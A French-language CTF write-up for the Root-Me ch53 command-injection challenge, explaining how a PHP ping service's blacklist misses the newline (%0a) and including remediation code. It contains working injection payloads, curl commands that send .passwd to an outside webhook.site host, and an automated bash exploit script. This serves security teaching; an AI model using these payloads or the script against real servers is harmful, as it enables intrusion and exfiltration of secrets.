# 🛡️ Guide Complet : Command Injection avec Contournement de Filtre WAF

> **Write-up CTF | Root-Me — Service de ping v2 (ch53)**  
> **Catégorie** : Web — Injection de commande  
> **Auteur** : [exploit4040](https://github.com/exploit4040)  
> **Date** : 23 avril 2026  
> **Difficulté** : Intermédiaire  
> **Flag** : `Comma@nd_1nJec7ion_Fl@9_**********`

---

## 🔍 Mots-clés SEO

`command injection`, `filter bypass`, `WAF bypass`, `OS command injection`, `CTF writeup`, `Root-Me ch53`,  
`%0a newline injection`, `shell_exec injection`, `PHP command injection`, `curl exfiltration`, `webhook exfiltration`,  
`ping command injection`, `preg_replace bypass`, `injection de commande filtre`, `contournement filtre WAF`

---

## 📌 Table des Matières

1. [Qu'est-ce que le Command Injection ?](#1-quest-ce-que-le-command-injection-)
2. [Présentation du challenge Root-Me ch53](#2-présentation-du-challenge-root-me-ch53)
3. [Analyse complète du code source vulnérable](#3-analyse-complète-du-code-source-vulnérable)
4. [Analyse du filtre WAF — Qu'est-ce qui est bloqué ?](#4-analyse-du-filtre-waf--quest-ce-qui-est-bloqué-)
5. [Identification des vecteurs d'attaque](#5-identification-des-vecteurs-dattaque)
6. [Exploitation pas à pas — Méthode 1 : cat direct](#6-exploitation-pas-à-pas--méthode-1--cat-direct)
7. [Exploitation avancée — Méthode 2 : Exfiltration via curl + Webhook](#7-exploitation-avancée--méthode-2--exfiltration-via-curl--webhook)
8. [Analyse de la requête HTTP interceptée (Burp Suite / DevTools)](#8-analyse-de-la-requête-http-interceptée-burp-suite--devtools)
9. [Analyse de la réponse Webhook.site](#9-analyse-de-la-réponse-webhooksite)
10. [Tous les payloads testés](#10-tous-les-payloads-testés)
11. [Pourquoi `%0a` fonctionne ? — Explication approfondie](#11-pourquoi-0a-fonctionne---explication-approfondie)
12. [Script d'exploitation automatisé](#12-script-dexploitation-automatisé)
13. [Remédiation et bonnes pratiques](#13-remédiation-et-bonnes-pratiques)
14. [Ressources et références](#14-ressources-et-références)

---

## 1. Qu'est-ce que le Command Injection ?

Le **Command Injection** (injection de commande OS) est une vulnérabilité critique classée dans le **Top 10 OWASP** (catégorie A03:2021 — Injection). Elle se produit lorsqu'une application web passe des données **non validées** fournies par l'utilisateur directement à un **shell système** (bash, sh, cmd.exe...).

### Principe de base

Imaginons une application web qui exécute un `ping` côté serveur :

```php
// Code vulnérable — NE JAMAIS faire ça en production
$cmd = "ping -c 3 " . $_POST["ip"];
shell_exec($cmd);
```

Si l'utilisateur entre `1.1.1.1`, la commande devient :

```bash
ping -c 3 1.1.1.1
```

Mais si l'utilisateur entre `1.1.1.1; cat /etc/passwd`, la commande devient :

```bash
ping -c 3 1.1.1.1; cat /etc/passwd
```

Le serveur exécute **deux commandes** : le ping ET la lecture du fichier `/etc/passwd`. C'est exactement ce qu'on appelle une **injection de commande**.

### Séparateurs de commandes courants

| Séparateur | Syntaxe | Comportement |
|------------|---------|--------------|
| `;` | `cmd1; cmd2` | Exécute cmd2 après cmd1 |
| `&&` | `cmd1 && cmd2` | Exécute cmd2 si cmd1 réussit |
| `\|\|` | `cmd1 \|\| cmd2` | Exécute cmd2 si cmd1 échoue |
| `\|` | `cmd1 \| cmd2` | Pipe — stdout de cmd1 → stdin de cmd2 |
| `%0a` | `cmd1%0aCMD2` | Newline — séparateur shell universel |
| `${IFS}` | `cat${IFS}.passwd` | Internal Field Separator — remplace l'espace |

### Pourquoi c'est dangereux ?

Une injection de commande donne à l'attaquant l'accès **direct au système d'exploitation** avec les droits du serveur web (souvent `www-data`). Cela peut mener à :

- Lecture de fichiers sensibles (`.env`, `.passwd`, configs)
- Reverse shell — prise de contrôle complète du serveur
- Exfiltration de données vers un serveur externe
- Mouvement latéral dans le réseau interne
- Escalade de privilèges si mal configuré

---

## 2. Présentation du challenge Root-Me ch53

**Root-Me** est une plateforme légale d'entraînement en cybersécurité. Le challenge **ch53 — "Injection de commande — Contournement de filtre"** est la suite du ch50 (version sans filtre).

### Contexte

- **URL** : `http://challenge01.root-me.org/web-serveur/ch53/index.php`
- **Service** : Application web de ping — l'utilisateur entre une IP et le serveur la ping
- **Objectif** : Lire le fichier `.passwd` malgré un filtre de sécurité
- **Différence avec ch50** : La version 2 ajoute un filtre `preg_replace()` qui supprime les caractères dangereux

### Interface du challenge

L'interface est minimaliste : un champ texte pour entrer une adresse IP, un bouton submit, et la réponse du ping qui s'affiche.

```
[ 127.0.0.1          ] [Submit]

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
...
3 packets transmitted, 3 received, 0% packet loss
```

---

## 3. Analyse complète du code source vulnérable

Voici le **code source complet** de la page vulnérable, tel qu'on peut le récupérer en lisant `index.php` via l'injection :

```html
<html>
<head>
    <title>Ping Service</title>
</head>
<body>
<form method="POST" action="index.php">
    <input type="text" name="ip" placeholder="127.0.0.1">
    <input type="submit">
</form>
<pre>
<?php 
$flag = "".file_get_contents(".passwd")."";

if(isset($_POST["ip"]) && !empty($_POST["ip"])){
    
    // FILTRE : suppression des caractères dangereux
    $ip = @preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);
    
    // Alternative commentée (str_replace)
    //$ip = @str_replace(['\\', '$', '|', '`', ';', '&', '<', '>'], "", $_POST["ip"]);
    
    // Exécution de la commande avec l'entrée utilisateur NON ÉCHAPPÉE
    $response = @shell_exec("timeout 5 bash -c 'ping -c 3 ".$ip."'");
    
    $receive = @preg_match("/3 packets transmitted, (.*) received/s", $response, $out);

    if ($out[1]=="3") {
        echo "Ping OK";
    } elseif ($out[1]=="0") {
        echo "Ping NOK";
    } else {
        echo "Syntax Error";
    }
}
?>
</pre>
</body>
</html>
```

### Analyse ligne par ligne

#### Ligne 1 — Lecture du flag

```php
$flag = "".file_get_contents(".passwd")."";
```

Le flag est **chargé en mémoire** au début de chaque requête mais il **n'est jamais affiché directement**. C'est une variable PHP en mémoire uniquement. Pour obtenir son contenu, il faut donc soit :
- Lire `.passwd` directement depuis le shell avec `cat`
- L'exfiltrer via une commande réseau

#### Ligne 2 — Le filtre (cœur de la vulnérabilité)

```php
$ip = @preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);
```

La fonction `preg_replace()` **supprime** (remplace par une chaîne vide) chaque caractère présent dans la liste de la regex. Ce n'est **pas un blocage** — c'est une suppression silencieuse.

#### Ligne 3 — L'exécution

```php
$response = @shell_exec("timeout 5 bash -c 'ping -c 3 ".$ip."'");
```

L'entrée (après filtre) est **concaténée directement** dans la chaîne de commande shell. Le `@` au début supprime les erreurs PHP (ce qui cache les indices d'erreur à l'attaquant, mais la commande s'exécute quand même).

La commande finale ressemble à :
```bash
timeout 5 bash -c 'ping -c 3 <VALEUR_DE_$ip>'
```

**Problème fondamental** : même après filtrage, si l'attaquant peut injecter un séparateur de commande non filtré, il contrôle ce qui s'exécute après le ping.

---

## 4. Analyse du filtre WAF — Qu'est-ce qui est bloqué ?

### Blacklist du filtre

Voici exactement ce que la regex `"/[\\\$|`;&<>]/"` filtre :

| Caractère | Encodage | Rôle en shell | Filtré ? |
|-----------|----------|---------------|----------|
| `\` | `%5C` | Backslash / Échappement | ✅ OUI |
| `$` | `%24` | Variable shell (`$cmd`, `$(cmd)`) | ✅ OUI |
| `\|` | `%7C` | Pipe (redirection stdout→stdin) | ✅ OUI |
| `` ` `` | `%60` | Backtick (exécution `\`cmd\``) | ✅ OUI |
| `;` | `%3B` | Séparateur de commandes classique | ✅ OUI |
| `&` | `%26` | Background / `&&` opérateur | ✅ OUI |
| `<` | `%3C` | Redirection input | ✅ OUI |
| `>` | `%3E` | Redirection output | ✅ OUI |

### Ce qui N'est PAS filtré (la faille)

| Caractère | Encodage URL | Rôle | Filtré ? |
|-----------|-------------|------|----------|
| `%0a` | newline (LF) | **Séparateur de commandes shell** | ❌ **NON** |
| `%0d` | carriage return (CR) | Séparateur alternatif | ❌ NON |
| `%09` | tabulation (TAB) | Remplace l'espace | ❌ NON |
| `%20` ou espace | espace | Séparateur d'arguments | ❌ NON |
| `.` | point | Accès fichiers cachés | ❌ NON |
| `@` | arobase | Utilisé dans `curl` | ❌ NON |
| `-` | tiret | Options de commandes | ❌ NON |

### Conclusion de l'analyse

Le filtre est **incomplet**. Il a bloqué les séparateurs les plus évidents (`;`, `|`, `&`) mais a **oublié le caractère newline** (`%0a`). En bash, un saut de ligne est **exactement équivalent** à un point-virgule — c'est un séparateur de commandes natif du shell.

---

## 5. Identification des vecteurs d'attaque

### Vecteur principal : `%0a` (newline injection)

En URL encoding, `%0a` est le code du caractère ASCII 10 — la **line feed** (LF). Dans un terminal bash, quand on appuie sur Entrée, c'est un `%0a` qui est envoyé. Le shell interprète donc :

```
ping -c 3 1.1.1.1
whoami
```

...comme **deux commandes distinctes**, exactement comme si on avait tapé `;` entre elles.

### Construction du payload de base

```
1.1.1.1%0awhoami
```

Ce que bash reçoit et exécute :
```bash
timeout 5 bash -c 'ping -c 3 1.1.1.1
whoami'
```

La sortie des deux commandes est retournée — l'injection fonctionne.

### Vecteur de remplacement de l'espace : `%09` (tabulation)

Si l'espace était filtré (ce qui n'est pas le cas ici), on pourrait utiliser `%09` (TAB) pour séparer la commande de ses arguments :

```
1.1.1.1%0acat%09.passwd
```

C'est une technique de contournement avancée pour les filtres qui bloquent aussi les espaces.

---

## 6. Exploitation pas à pas — Méthode 1 : cat direct

### Étape 1 — Vérifier l'injection avec `id`

**Payload envoyé dans le champ IP** :
```
1.1.1.1%0aid
```

**Ce que le serveur exécute** :
```bash
timeout 5 bash -c 'ping -c 3 1.1.1.1
id'
```

**Réponse attendue** : La sortie de `ping` suivie de quelque chose comme `uid=33(www-data) gid=33(www-data)`.

Cela confirme l'injection. On sait maintenant le contexte d'exécution (`www-data`).

---

### Étape 2 — Lire `index.php` pour découvrir la structure

**Payload** :
```
1.1.1.1%0acat%20index.php
```

**Ce que le serveur exécute** :
```bash
timeout 5 bash -c 'ping -c 3 1.1.1.1
cat index.php'
```

**Résultat** : Le code PHP source de la page s'affiche. On découvre :

```php
$flag = "".file_get_contents(".passwd")."";
```

→ Le fichier cible est **`.passwd`** dans le répertoire courant du serveur.

---

### Étape 3 — Lire directement `.passwd`

**Payload final** :
```
1.1.1.1%0acat%20.passwd
```

**Ce que le serveur exécute** :
```bash
timeout 5 bash -c 'ping -c 3 1.1.1.1
cat .passwd'
```

**Résultat** : Le contenu du fichier `.passwd` s'affiche dans la page. ✅

---

## 7. Exploitation avancée — Méthode 2 : Exfiltration via curl + Webhook

Cette méthode est plus réaliste dans un vrai scénario de pentest où la sortie de la commande **n'est pas reflétée** dans la page (blind command injection). Elle consiste à exfiltrer le flag vers un serveur externe qu'on contrôle.

### Qu'est-ce que Webhook.site ?

**Webhook.site** est un service en ligne qui génère une URL unique capable de recevoir des requêtes HTTP. On l'utilise comme "récepteur" pour nos données exfiltrées. C'est l'équivalent d'un listener netcat, mais accessible depuis internet.

URL générée pour cette session :
```
http://webhook.site/76e26787-dba4-4f7e-a917-ec95a8b7994b
```

### Construction du payload d'exfiltration

```
1.1.1.1%0acurl%20-X%20POST%20--data-binary%20@.passwd%20http://webhook.site/76e26787-dba4-4f7e-a917-ec95a8b7994b
```

Décomposition du payload :

| Partie | Signification |
|--------|---------------|
| `1.1.1.1` | IP valide pour passer la validation de base |
| `%0a` | Newline — séparateur de commandes |
| `curl` | Outil de requête HTTP installé sur le serveur |
| `-X%20POST` | Méthode HTTP POST |
| `--data-binary` | Envoie le contenu d'un fichier en binaire |
| `@.passwd` | `@` + nom du fichier = curl lit et envoie ce fichier |
| `http://webhook.site/...` | Notre récepteur externe |

**Ce que le serveur exécute** :
```bash
timeout 5 bash -c 'ping -c 3 1.1.1.1
curl -X POST --data-binary @.passwd http://webhook.site/76e26787-dba4-4f7e-a917-ec95a8b7994b'
```

Le serveur lit `.passwd` et l'envoie en POST vers notre webhook. ✅

---

## 8. Analyse de la requête HTTP interceptée (Burp Suite / DevTools)

Voici la **requête HTTP complète** envoyée au serveur lors de l'exploitation (capture Burp Suite / Firefox DevTools) :

```http
POST /web-serveur/ch53/index.php HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Origin: http://challenge01.root-me.org
Connection: keep-alive
Referer: http://challenge01.root-me.org/web-serveur/ch53/index.php
Cookie: _ga_SRYSKX09J7=GS2.1.s1776931836$o8$g1$t1776932289$j34$l0$h0; _ga=GA1.1.898856852.1776283431
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=1.1.1.1%0acurl%20-X%20POST%20--data-binary%20@.passwd%20http://webhook.site/76e26787-dba4-4f7e-a917-ec95a8b7994b
```

### Points importants à analyser

- **`Content-Type: application/x-www-form-urlencoded`** → Les données sont encodées en URL. C'est pour ça que `%0a`, `%20` etc. sont transmis tels quels et décodés côté serveur avant traitement.
- **`Content-Length: 115`** → La longueur exacte du body. Burp calcule ça automatiquement.
- **Le body** : `ip=1.1.1.1%0acurl%20-X%20POST%20--data-binary%20@.passwd%20http://...`
  - Tout ce qui suit `ip=` est la valeur soumise dans le champ "ip"
  - PHP reçoit `$_POST["ip"]` contenant le payload complet

---

## 9. Analyse de la réponse Webhook.site

Le webhook a reçu **deux requêtes** lors de l'exploitation. Voici leur analyse :

### Requête 1 — Flag direct (cat .passwd via curl)

```
POST   http://webhook.site/76e26787-dba4-4f7e-a917-ec95a8b7994b
Date   23/04/2026 10:06:31
Size   41 bytes
Time   0.001 sec
User-Agent   curl/7.68.0
Host   webhook.site
```

**Contenu brut reçu** :
```
Comma@nd_1nJec7ion_Fl@9************
```

✅ **C'est le flag !** Le serveur a envoyé le contenu de `.passwd` en 41 bytes via curl.

### Requête 2 — Code source complet (index.php exfiltré)

```
POST   http://webhook.site/76e26787-dba4-4f7e-a917-ec95a8b7994b
Date   23/04/2026 10:04:31
Size   879 bytes
Time   0.001 sec
User-Agent   curl/7.68.0
```

**Contenu reçu** : Le code source PHP complet de `index.php` — c'est ce qui nous a permis de comprendre la structure du challenge et de construire l'exploit final.

### Ce que cette réponse prouve

1. Le serveur tourne avec **`curl/7.68.0`** → Ubuntu 20.04 / Debian 10 (version typique)
2. La requête vient d'une IP **IPv6** : `2001:bc8:35b0:c166::151` → localisée à **Amsterdam, Pays-Bas** (infrastructure Root-Me)
3. Le temps de réponse est **0.001 sec** → le serveur a exécuté la commande instantanément
4. L'exfiltration réseau fonctionne depuis le serveur → pas de pare-feu sortant restrictif

---

## 10. Tous les payloads testés

### Payloads de reconnaissance

```bash
# Tester si l'injection fonctionne
1.1.1.1%0aid
1.1.1.1%0awhoami
1.1.1.1%0ahostname

# Lister les fichiers du répertoire courant
1.1.1.1%0als
1.1.1.1%0als%20-la

# Lire le code source de la page
1.1.1.1%0acat%20index.php
```

### Payloads de lecture directe

```bash
# Lecture standard
1.1.1.1%0acat%20.passwd

# Avec tabulation à la place de l'espace
1.1.1.1%0acat%09.passwd

# Avec less (si cat est bloqué)
1.1.1.1%0aless%20.passwd

# Avec head
1.1.1.1%0ahead%20.passwd
```

### Payloads d'exfiltration réseau

```bash
# Exfiltration via curl POST (flag en body)
1.1.1.1%0acurl%20-X%20POST%20--data-binary%20@.passwd%20http://webhook.site/76e26787-dba4-4f7e-a917-ec95a8b7994b

# Exfiltration base64 (si le contenu est binaire ou encodé)
1.1.1.1%0abase64%20.passwd%20|%20curl%20-X%20POST%20--data-binary%20@-%20http://webhook.site/xxx

# Exfiltration via User-Agent header (stéganographie HTTP)
1.1.1.1%0acurl%20-A%20$(cat%20.passwd)%20http://webhook.site/xxx

# Encodage du flag en hex avant envoi
1.1.1.1%0axxd%20.passwd%20|%20curl%20-X%20POST%20--data-binary%20@-%20http://webhook.site/xxx
```

### Tableau récapitulatif

| N° | Objectif | Payload | Résultat |
|----|----------|---------|---------|
| 1 | Test basique | `1.1.1.1%0aid` | `uid=33(www-data)` ✅ |
| 2 | Lister fichiers | `1.1.1.1%0als%20-la` | Contenu du dossier ✅ |
| 3 | Lire index.php | `1.1.1.1%0acat%20index.php` | Code source PHP ✅ |
| 4 | **Flag direct** | `1.1.1.1%0acat%20.passwd` | **FLAG** ✅ |
| 5 | Flag (tab bypass) | `1.1.1.1%0acat%09.passwd` | **FLAG** ✅ |
| 6 | **Exfil curl** | `1.1.1.1%0acurl%20-X%20POST%20--data-binary%20@.passwd%20http://webhook.site/...` | **FLAG reçu sur webhook** ✅ |

---

## 11. Pourquoi `%0a` fonctionne ? — Explication approfondie

### La table ASCII et l'encodage URL

En informatique, chaque caractère a un code numérique. En **encodage URL** (percent-encoding, RFC 3986), on représente un caractère par son code hexadécimal précédé de `%`.

| Caractère | Décimal ASCII | Hex | URL Encoding |
|-----------|--------------|-----|--------------|
| `;`       | 59           | 3B  | `%3B` → **filtré** |
| `\|`      | 124          | 7C  | `%7C` → **filtré** |
| LF (newline) | 10        | 0A  | `%0a` → **non filtré** |
| TAB       | 9            | 09  | `%09` → non filtré |
| Espace    | 32           | 20  | `%20` → non filtré |

### Comportement du shell face à `%0a`

Quand PHP reçoit `%0a` dans le body d'un POST, il le **décode** avant de le passer à `$_POST["ip"]`. Donc la variable PHP contient littéralement un caractère newline (ASCII 10).

Le filtre `preg_replace()` cherche `[\\\$|`;&<>]` dans la chaîne — il ne cherche **pas** `\n` (newline). Donc `%0a` passe à travers le filtre sans modification.

Ensuite, cette chaîne avec le newline est concaténée dans la commande shell :

```php
"timeout 5 bash -c 'ping -c 3 " . $ip . "'"
// Résultat :
// timeout 5 bash -c 'ping -c 3 1.1.1.1
// cat .passwd'
```

En bash, **une nouvelle ligne est un délimiteur de commande**. C'est exactement pour ça que `;` a été créé — comme alternative à la newline quand on veut tout écrire sur une seule ligne. Le shell voit donc deux commandes distinctes et les exécute toutes les deux.

### Représentation visuelle

```
Input utilisateur (URL-encoded) :
  ip=1.1.1.1%0acat%20.passwd

Après décodage URL par PHP :
  ip = "1.1.1.1\ncat .passwd"
             ↑
         Ce caractère est un vrai saut de ligne

Après preg_replace (filtre) :
  ip = "1.1.1.1\ncat .passwd"  ← RIEN n'est supprimé, %0a n'est pas dans la blacklist

Commande construite par PHP :
  timeout 5 bash -c 'ping -c 3 1.1.1.1
cat .passwd'

Ce que bash exécute :
  [1] ping -c 3 1.1.1.1
  [2] cat .passwd          ← INJECTION RÉUSSIE
```

---

## 12. Script d'exploitation automatisé

```bash
#!/bin/bash
# ============================================================
# exploit_ch53.sh — Root-Me Command Injection Filter Bypass
# Auteur : exploit4040 | github.com/exploit4040
# Usage  : bash exploit_ch53.sh [--webhook URL]
# ============================================================

TARGET="http://challenge01.root-me.org/web-serveur/ch53/index.php"
COOKIE="_ga=GA1.1.898856852.1776283431"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

banner() {
    echo -e "${RED}"
    echo "  ██████╗███╗   ███╗██████╗     ██╗███╗   ██╗     ██╗"
    echo " ██╔════╝████╗ ████║██╔══██╗    ██║████╗  ██║     ██║"
    echo " ██║     ██╔████╔██║██║  ██║    ██║██╔██╗ ██║     ██║"
    echo " ██║     ██║╚██╔╝██║██║  ██║    ██║██║╚██╗██║██   ██║"
    echo " ╚██████╗██║ ╚═╝ ██║██████╔╝    ██║██║ ╚████║╚█████╔╝"
    echo "  ╚═════╝╚═╝     ╚═╝╚═════╝     ╚═╝╚═╝  ╚═══╝ ╚════╝ "
    echo -e "${NC}"
    echo -e "${CYAN} Root-Me ch53 — Command Injection Filter Bypass${NC}"
    echo -e "${CYAN} Auteur : exploit4040 | github.com/exploit4040${NC}"
    echo ""
}

run_payload() {
    local description="$1"
    local payload="$2"
    
    echo -e "${YELLOW}[*] $description${NC}"
    echo -e "    Payload : ${CYAN}$payload${NC}"
    
    RESPONSE=$(curl -s -X POST "$TARGET" \
        -H "Cookie: $COOKIE" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data-urlencode "ip=$payload" \
        --max-time 10)
    
    echo -e "${GREEN}[+] Réponse :${NC}"
    echo "$RESPONSE" | grep -v "^$" | head -20
    echo ""
}

banner

echo -e "${RED}[*] Phase 1 — Reconnaissance${NC}"
echo "─────────────────────────────────"
run_payload "Test injection (whoami)" "1.1.1.1
whoami"
run_payload "Listing des fichiers" "1.1.1.1
ls -la"

echo -e "${RED}[*] Phase 2 — Lecture du code source${NC}"
echo "─────────────────────────────────────"
run_payload "Lecture de index.php" "1.1.1.1
cat index.php"

echo -e "${RED}[*] Phase 3 — Capture du flag${NC}"
echo "─────────────────────────────────"
run_payload "Lecture du fichier .passwd" "1.1.1.1
cat .passwd"

# Optionnel : exfiltration via webhook
if [ -n "$1" ] && [ "$1" == "--webhook" ] && [ -n "$2" ]; then
    WEBHOOK="$2"
    echo -e "${RED}[*] Phase 4 — Exfiltration vers webhook${NC}"
    echo "────────────────────────────────────────"
    run_payload "Envoi de .passwd vers $WEBHOOK" "1.1.1.1
curl -X POST --data-binary @.passwd $WEBHOOK"
    echo -e "${GREEN}[+] Vérifiez votre webhook pour le flag exfiltré !${NC}"
fi

echo -e "${GREEN}[✓] Exploitation terminée.${NC}"
```

### Utilisation

```bash
# Exploitation basique
bash exploit_ch53.sh

# Avec exfiltration webhook
bash exploit_ch53.sh --webhook http://webhook.site/votre-url-unique
```

---

## 13. Remédiation et bonnes pratiques

La vulnérabilité vient d'une **blacklist incomplète**. La bonne pratique en sécurité est de toujours préférer une **whitelist** (liste blanche) à une **blacklist** (liste noire). Une blacklist peut toujours être contournée car il est impossible de prévoir tous les caractères dangereux.

### ❌ Ce qu'il ne faut JAMAIS faire

```php
// MAUVAIS — Blacklist incomplète, contournable
$ip = preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);
$response = shell_exec("ping -c 3 " . $ip);
```

Problèmes :
- Oubli du newline `%0a`
- Oubli de nombreux autres séparateurs
- Concaténation directe dans shell_exec

---

### ✅ Solution 1 — Whitelist stricte (meilleure approche)

```php
// BIEN — On n'accepte QUE les caractères d'une adresse IP valide
if (!preg_match('/^[0-9.]{7,15}$/', $_POST["ip"])) {
    die("Erreur : adresse IP invalide.");
}
$ip = $_POST["ip"];
$response = shell_exec("ping -c 3 " . escapeshellarg($ip));
```

Cette approche est la plus sûre : si le caractère n'est pas un chiffre ou un point, la requête est rejetée.

---

### ✅ Solution 2 — Validation native PHP avec `FILTER_VALIDATE_IP`

```php
// BIEN — PHP valide si c'est une vraie adresse IP
$ip = filter_var($_POST["ip"], FILTER_VALIDATE_IP);
if ($ip === false) {
    die("Adresse IP invalide.");
}
$response = shell_exec("ping -c 3 " . escapeshellarg($ip));
```

`FILTER_VALIDATE_IP` rejette tout ce qui n'est pas une adresse IPv4 ou IPv6 valide — ce qui exclut naturellement tous les caractères d'injection.

---

### ✅ Solution 3 — `escapeshellarg()` (couche de protection supplémentaire)

```php
// BIEN — Échappe l'argument pour une utilisation shell sécurisée
$ip = escapeshellarg($_POST["ip"]);
$response = shell_exec("ping -c 3 " . $ip);
```

`escapeshellarg()` encadre la valeur dans des apostrophes et échappe toutes les apostrophes existantes. Même si l'utilisateur envoie du code malveillant, il sera traité comme une chaîne littérale et non comme une commande.

---

### ✅ Solution ultime — Combiner toutes les protections

```php
<?php
// PROTECTION MAXIMALE
$input = $_POST["ip"] ?? "";

// 1. Valider le format (whitelist)
if (!filter_var($input, FILTER_VALIDATE_IP)) {
    http_response_code(400);
    die(json_encode(["error" => "Invalid IP address"]));
}

// 2. Échapper pour le shell (défense en profondeur)
$ip = escapeshellarg($input);

// 3. Exécuter sans concaténation dangereuse
$response = shell_exec("ping -c 3 " . $ip);

// 4. Limiter la sortie
echo htmlspecialchars($response);
?>
```

### Tableau comparatif des solutions

| Solution | Protège contre `%0a` | Protège contre `$()` | Complexité | Recommandée |
|----------|---------------------|---------------------|------------|-------------|
| Blacklist (code original) | ❌ | ❌ | Faible | ❌ Non |
| Whitelist regex | ✅ | ✅ | Faible | ✅ Oui |
| `FILTER_VALIDATE_IP` | ✅ | ✅ | Très faible | ✅ Oui |
| `escapeshellarg()` seul | ✅ | ✅ | Faible | ⚠️ Partiel |
| Combinaison des 3 | ✅ | ✅ | Moyenne | ✅✅ Idéal |

---

## 14. Ressources et références

### Documentation officielle

- 📖 [OWASP — OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- 📖 [OWASP — Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- 📖 [CWE-78 — Improper Neutralization of Special Elements](https://cwe.mitre.org/data/definitions/78.html)
- 📖 [PHP Docs — escapeshellarg()](https://www.php.net/manual/fr/function.escapeshellarg.php)
- 📖 [PHP Docs — shell_exec()](https://www.php.net/manual/fr/function.shell-exec.php)

### CTF et entraînement

- 🎯 [Root-Me — Challenge ch53](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre)
- 🎯 [Root-Me — Challenge ch50 (version sans filtre)](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande)
- 🎯 [HackTheBox](https://www.hackthebox.com/)
- 🎯 [TryHackMe — Command Injection Room](https://tryhackme.com/)

### Payloads et cheat sheets

- 📚 [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- 📚 [HackTricks — Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)

### Outils utilisés

- 🔧 [Burp Suite](https://portswigger.net/burp) — Interception et modification de requêtes HTTP
- 🔧 [Webhook.site](https://webhook.site) — Réception de requêtes HTTP pour exfiltration
- 🔧 [curl](https://curl.se/) — Outil de requête HTTP en ligne de commande
- 🔧 [Firefox DevTools](https://firefox-source-docs.mozilla.org/devtools-user/) — Inspection des requêtes réseau

---

## 📜 Disclaimer

> Ce write-up est fourni **uniquement à des fins éducatives**.  
> Les techniques présentées ici sont pratiquées sur la plateforme légale **Root-Me**, conçue pour l'entraînement en cybersécurité.  
> N'utilisez jamais ces techniques sur des systèmes sans **autorisation explicite écrite**.  
> L'auteur décline toute responsabilité en cas d'utilisation malveillante.

---

<div align="center">

**Auteur** : [exploit4040](https://github.com/exploit4040)  
**Plateforme** : Root-Me | [root-me.org](https://www.root-me.org)  
*Follow pour plus de write-ups CTF et de recherches en cybersécurité ⚡*

⭐ N'oublie pas de star ce repo si ce write-up t'a aidé !

</div>
